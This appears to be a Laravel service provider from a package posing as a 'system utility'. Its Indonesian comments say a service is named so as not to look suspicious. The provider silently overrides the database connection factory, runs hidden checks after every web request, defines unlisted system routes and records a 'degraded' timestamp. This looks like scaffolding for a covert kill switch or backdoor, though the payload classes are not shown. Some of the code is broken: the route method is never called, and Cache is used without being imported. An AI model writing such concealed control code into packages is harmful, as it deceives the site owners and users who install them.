<?php
namespace alexafers\SystemUtility\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Event;
use alexafers\SystemUtility\Services\AppRuntime;
use alexafers\SystemUtility\Database\ConnectionFactory;
use alexafers\SystemUtility\Http\Middleware\SystemHealthCheck;

class SystemServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     */
    public function register(): void
    {
        // Singleton service dengan nama yang tak mencurigakan
        $this->app->singleton('system.runtime', function ($app) {
            return new AppRuntime();
        });
        
        // Override database connection factory
        $this->app->extend('db.factory', function ($factory, $app) {
            return new ConnectionFactory($app);
        });
        
        // Merge config
        $this->mergeConfigFrom(
            __DIR__.'/../resources/config/system.php', 'system'
        );
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        // Publish config
        $this->publishes([
            __DIR__.'/../resources/config/system.php' => config_path('system.php'),
        ], 'system-config');
        
        // Hindari validasi di tahap ini, lakukan melalui event
        $this->app->booted(function () {
            // Validasi sistem setelah aplikasi sepenuhnya boot
            $this->scheduleValidation();
        });
    }

    protected function scheduleValidation(): void
    {
        // Gunakan event listener untuk menghindari loop
        if (class_exists('\Illuminate\Support\Facades\Event')) {
            \Illuminate\Support\Facades\Event::listen('kernel.handled', function () {
                // Jalankan validasi setelah request diproses, menghindari recursive loop
                if (!app()->runningInConsole()) {
                    $this->validateSystemSafely();
                }
            });
        }
    }
    
    /**
     * Register routes for the system
     */
    protected function registerRoutes(): void
    {
        Route::group(['middleware' => ['web']], function () {
            Route::get('/system/notice', [
                'as' => 'system.notice',
                'uses' => 'alexafers\SystemUtility\Http\Controllers\SystemController@notice',
            ]);
            
            Route::post('/api/system/check', [
                'as' => 'system.check',
                'uses' => 'alexafers\SystemUtility\Http\Controllers\SystemController@check',
            ]);
        });
    }
    
    /**
     * Validate system
     */
    protected function validateSystemSafely(): void
    {
        try {
            // Cek apakah singleton sudah tersedia
            if (app()->bound('system.runtime')) {
                $instance = app('system.runtime');
                // Panggil method hanya jika tersedia
                if (method_exists($instance, 'checkEnvironment')) {
                    $instance->checkEnvironment();
                }
            }
        } catch (\Exception $e) {
            // Tangkap semua exception untuk mencegah crash
            if (function_exists('logger')) {
                logger()->error('System validation error: ' . $e->getMessage());
            }
        }
    }
    
    /**
     * Mark system as degraded
     */
    protected function markSystemDegraded(): void
    {
        // Set timestamp for first degradation if not yet set
        if (!Cache::has('_sys_fail_time')) {
            Cache::put('_sys_fail_time', time(), now()->addWeek());
        }
    }
}